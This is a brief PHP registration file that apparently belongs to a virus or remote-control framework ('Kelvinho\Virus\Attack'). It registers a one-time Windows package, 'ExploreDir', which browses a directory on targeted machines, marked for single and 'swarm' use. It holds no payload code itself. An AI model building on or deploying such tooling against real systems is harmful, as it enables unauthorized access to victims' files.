<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.ExploreDir", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ExploreDir", "easy.ExploreDir", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Explores a particular directory.");